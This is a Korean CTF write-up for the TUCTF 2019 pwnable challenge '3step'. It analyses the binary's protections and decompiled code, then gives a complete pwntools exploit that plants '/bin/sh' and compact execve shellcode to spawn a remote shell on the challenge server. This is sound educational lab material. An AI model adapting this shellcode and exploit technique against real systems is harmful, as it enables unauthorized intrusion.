+++
title = "TUCTF 2019 Pwnable 3step"
subtitle = "3step"

# Add a summary to display on homepage (optional).
summary = "pwnable 3step"

date = "2019-12-03T03:33:19+09:00"
publishDate = "2019-12-03T03:33:19+09:00"
expiryDate = ""

# Authors. Comma separated list, e.g. `["Bob Smith", "David Jones"]`.
authors = []

# Tags and categories
# For example, use `tags = []` for no tags, or the form `tags = ["A Tag", "Another Tag"]` for one or more tags.
tags = ['CTF', '2019', 'pwn', '3step']
categories = ['PWN']
keywords = ['CTF', '2019', 'pwn', '3step']

# Projects (optional).
#   Associate this post with one or more of your projects.
#   Simply enter your project's folder or file name without extension.
#   E.g. `projects = ["deep-learning"]` references 
#   `content/project/deep-learning/index.md`.
#   Otherwise, set `projects = []`.
# projects = ["internal-project"]

# Featured image
# To use, add an image named `featured.jpg/png` to your page's folder. 
[image]
  # Caption (optional)
  caption = ""

  # Focal point (optional)
  # Options: Smart, Center, TopLeft, Top, TopRight, Left, Right, BottomLeft, Bottom, BottomRight
  focal_point = ""

draft = false
+++

32bit 바이너리 `3step`와 접속 정보 `nc chal.tuctf.com 30504`가 주어졌습니다.
```py
>>> e = ELF('./3step')
[*] '/root/ctf/2019/tu/pwn/3step/3step'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```
i386 바이너리이고  
Full RELRO 이므로 GOT Overwrite는 아니며  
Canary가 있으므로 BOF는 아니고  
NX bit가 해제되어 있고 RWX 세그먼트가 있으므로 100% 스택에 쉘코드 실행 가능합니다.   
<br>

```plain
j3rrry@kali:3step# nc chal.tuctf.com 30504
Welcome to our 3-step program!
Try out complimentary snacks
0x5665000c
0xffb5c08c

Step 1: j3rrry
Step 2: j4rrry
Step 3: j5rrry
```
문제 서버에 접속해보면 16진수 2개를 알려준 다음 3 Step에 걸쳐서 입력을 받습니다.  
<br>

```c
void __cdecl pwnme()
{
  void (*v0)(void); // [sp+8h] [bp-20h]@1
  char buf; // [sp+Ch] [bp-1Ch]@1
  int v2; // [sp+1Ch] [bp-Ch]@1

  v2 = *MK_FP(__GS__, 20);
  puts("Try out complimentary snacks");
  printf("%p\n", &buf1);
  printf("%p\n\n", &buf);
  printf("Step 1: ");
  read(0, &buf1, 0x12);
  printf("Step 2: ");
  read(0, &buf, 0x10);
  printf("Step 3: ");
  read(0, &v0, 4);
  v0();
  if ( *MK_FP(__GS__, 20) != v2 )
    _stack_chk_fail_local();
}
```
바이너리를 디스어셈블링 해보면  
buf1과 buf의 주소를 출력해준다는 것을 알 수 있습니다.  
buf1은 bss 영역, buf는 스택 영역입니다.  
  
그리고 입력을 받는데 길이제한이 0x12, 0x10, 4로 매우 작습니다.  
쉘코드를 경량화하도록 커스텀을 해야하는데요.

# Exploit
```py
from pwn import *

def start():
    e = ELF('./3step')
    r = remote('chal.tuctf.com', 30504)

    return e, r

def info():
    r.recvuntil('0x')
    bss = int(r.recvline(), 16)
    stack = int(r.recvline(), 16)
    log.info(hex(bss) + ' bss')
    log.info(hex(stack) + ' stack')

    return bss, stack

def step1():
    r.recvuntil(': ')
    r.send('/bin/sh')

def step2():
    r.recvuntil(': ')
    r.send(shellcode)

def step3():
    r.recvuntil(': ')
    r.send(p32(stack))

if __name__ == '__main__':
    e, r = start()
    bss, stack = info()

    shellcode = '''
        mov ebx, {}
        xor ecx, ecx
        xor edx, edx
        xor eax, eax
        mov al, 0xb
        int 0x80
        mov al, 0xb
        int 0x80
    '''.format(bss)
    shellcode = asm(shellcode)

    step1()
    step2()
    step3()

    r.interactive()
```
